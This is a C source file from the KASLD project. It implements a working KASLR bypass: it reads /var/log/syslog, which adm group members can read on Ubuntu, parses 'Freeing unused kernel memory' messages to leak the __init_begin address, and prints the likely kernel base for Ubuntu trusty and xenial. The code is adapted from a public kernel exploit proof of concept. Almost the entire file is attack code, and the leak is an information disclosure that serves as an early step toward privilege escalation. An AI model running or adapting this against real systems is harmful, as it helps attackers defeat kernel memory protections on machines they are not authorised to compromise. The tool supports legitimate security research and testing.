// This file is part of KASLD - https://github.com/bcoles/kasld
//
// free_reserved_area() syslog KASLR bypass for SMP kernels.
//
// On Ubuntu systems, `kernel.dmesg_restrict` can be bypassed by
// users in the `adm` group, due to file read permissions on log
// files in `/var/log/`.
//
// $ ls -la /var/log/syslog /var/log/kern.log
// -rw-r----- 1 syslog adm 1916625 Dec 31 04:24 /var/log/kern.log
// -rw-r----- 1 syslog adm 1115029 Dec 31 04:24 /var/log/syslog
//
// free_reserved_area() leak was removed in kernel v4.10-rc1 on 2016-10-26:
// https://github.com/torvalds/linux/commit/adb1fe9ae2ee6ef6bc10f3d5a588020e7664dfa7
//
// Mostly taken from original code by xairy:
// https://github.com/xairy/kernel-exploits/blob/master/CVE-2017-1000112/poc.c

#define _GNU_SOURCE
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include "kasld.h"

unsigned long get_kernel_addr_free_reserved_area_syslog() {
  FILE *f;
  char *path = "/var/log/syslog";
  const int addr_len = sizeof(long*) * 2;
  unsigned long addr = 0;
  char buff[BUFSIZ];

  printf("[.] checking %s for free_reserved_area() info ...\n", path);

  f = fopen(path, "rb");
  if (f == NULL) {
    printf("[-] open/read(%s): %m\n", path);
    return 0;
  }

  while ((fgets(buff, BUFSIZ, f)) != NULL) {
    const char *needle1 = "Freeing unused kernel memory";
    char *substr =
        (char *)memmem(&buff[0], BUFSIZ, needle1, strlen(needle1));

    if (substr == NULL)
      continue;

    char *line_buf = strtok(substr, "\n");
    if (line_buf == NULL)
      return 0;

    char *addr_buf = strstr(line_buf, "(");
    if (addr_buf == NULL)
      return 0;

    char *endptr = &addr_buf[addr_len];
    addr = strtoul(&addr_buf[1], &endptr, 16);

    if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX)
      break;

    addr = 0;
  }

  fclose(f);

  return addr;
}

int main(int argc, char **argv) {
  unsigned long addr = get_kernel_addr_free_reserved_area_syslog();
  if (!addr)
    return 1;

  printf("leaked __init_begin: %lx\n", addr);
  printf("possible kernel base: %lx\n", addr &~ KERNEL_BASE_MASK);

#if defined(__x86_64__) || defined(__amd64__)
  printf("kernel base (ubuntu trusty): %lx\n", addr & 0xffffffffff000000ul);
  printf("kernel base (ubuntu xenial): %lx\n",
         (addr & 0xfffffffffff00000ul) - 0x1000000ul);
#endif

  return 0;
}
